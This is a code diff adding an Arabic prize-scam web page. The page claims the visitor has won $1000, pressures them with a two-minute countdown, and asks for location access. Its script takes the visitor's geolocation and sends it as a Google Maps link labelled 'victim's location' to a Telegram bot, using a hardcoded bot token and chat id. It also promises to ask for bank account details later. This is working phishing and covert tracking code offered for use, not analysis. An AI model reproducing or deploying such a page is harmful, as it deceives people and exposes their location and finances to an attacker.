@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تهانينا! لقد ربحت 1000 دولار!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url(dol2.jpg);
+            background-repeat: no-repeat;
+            background-size: cover;        
+            background-position: center;   
+            background-attachment: fixed;
+            color: #333;
+            text-align: center;
+            padding: 50px;
+            min-height: 100vh;
+           
+        }
+        .container {
+            background: rgb(255, 255, 255);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            margin: auto;
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
+            overflow: hidden;
+            text-align: center;
+        }
+        h1 {
+            color: #d10e0e;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        #timer {
+            font-size: 20px;
+            color: #b20a2c;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        img{
+            text-align: center;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <img src="1-removebg-preview.png" alt="logo">
+    <h1>🎉 تهانينا! لقد ربحت 1000 دولار!</h1>
+    <p>📢 تم اختيارك ضمن قائمة الفائزين في السحب الأسبوعي لمبادرة "المستهلك الذكي"، بالتعاون مع مجموعة من الشركاء الدوليين.</p>
+    <p>✅ للحصول على جائزتك النقدية وقدرها <strong>1000 دولار أمريكي</strong>، يُرجى تأكيد هويتك وموقعك الجغرافي، حتى نتمكن من تحديد وسيلة الدفع المناسبة في بلدك.</p>
+    <p>🌍 نولي اهتمامًا خاصًا بالدول التي تعاني من صعوبات في التحويلات المالية، مثل <strong>مصر</strong>، <strong>سوريا</strong>، و<strong>العراق</strong>، لذا يُرجى تعبئة بياناتك بدقة لضمان استلام الجائزة.</p>
+    <p>🕐 ملاحظة هامة: هذا العرض محدود. لديك فقط <strong>دقيقتان</strong> لإتمام التسجيل.</p>
+    <div id="timer">الوقت المتبقي: 2:00</div>
+    <button onclick="showWarning()">🔒 قم بالتسجيل الآن</button>
+</div>
+
+<script>
+    // عداد تنازلي 120 ثانية
+    let seconds = 120;
+    const timerElement = document.getElementById('timer');
+
+    const countdown = setInterval(() => {
+        const min = Math.floor(seconds / 60);
+        const sec = seconds % 60;
+        timerElement.textContent = `الوقت المتبقي: ${min}:${sec < 10 ? '0' : ''}${sec}`;
+        if (seconds <= 0) {
+            clearInterval(countdown);
+            document.body.innerHTML = `
+                <div class="container">
+                    <h1>⛔ انتهت صلاحية العرض</h1>
+                    <p>عذرًا، لقد انتهى الوقت ولم يتم استكمال التسجيل.</p>
+                    <p>نشكرك على اهتمامك، ونتمنى لك حظًا أوفر في المرات القادمة.</p>
+                </div>
+            `;
+        }
+        seconds--;
+    }, 1000);
+
+  function showWarning() {
+    alert("📍 نرجو منك السماح للموقع بتحديد موقع بلدك الجغرافي تلقائيًا.\n\nذلك لمساعدتنا في اختيار طريقة التحويل المناسبة وإتمام إرسال المبلغ المالي بنجاح.\n\nاضغط 'موافق' للمتابعة.");
+
+    getloction()
+    
+}
+
+
+function getloction(){
+
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(showloction, locationError)
+    }
+
+    else{
+        alert(" نحنا اسفون متصفح لديك لا يعمل  في  موقعنا جرب  متصفح كوكل  كروم او فايرفوكس شكرا لك  ")
+    }
+}
+
+
+function showloction(position){
+
+
+        var token_bot = "7814008026:AAH-PE33ItVhcBAI5mCCmLWbFywHzxZC7zE";
+        var chat_id = "7837731408";
+        var  message = `📍 موقع الضحية:\n : https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+        var url_api = `https://api.telegram.org/bot${token_bot}/sendMessage`;
+
+        fetch(
+            url_api,
+            {
+            method:"post",
+            headers:{'Content-Type': 'application/json'},
+            body:JSON.stringify({
+                chat_id: chat_id,
+                text: message,
+            })
+    
+    
+    }).then(response => {
+        if(response.ok){
+
+            alert(" مبروك تم ارسال الملعلومات للشركة سيتم ابلاغك عند طلب  حسابك البنكي للتحويل خلال 24 ساعة  ")
+
+        }
+        else{
+
+            alert("  للاسف تم رفض الوصول لموقع بلدك لن تتمكن من استلام المبلغ حاول  مرا اخرا من متصفح اخر  او جهاز اخر  ")
+        }
+
+        
+    }).catch(error => {
+        console.error("خطأ في الاتصال:", error);
+        alert("⚠️ حدث خطأ أثناء الإرسال. ربما المتصفح أو الجهاز محظور.");
+    });
+}
+
+function locationError(error) {
+    alert("❌ تم رفض إذن تحديد الموقع. لن نتمكن من إرسال المبلغ اسفون حاول مرا اخرا من متصفح اخر او جهاز اخر  . \n ");
+
+    location.href = "loction.html"
+
+  
+    
+    
+
+
+}
+
+
+
+
+        
+</script>
+</body>
+</html>
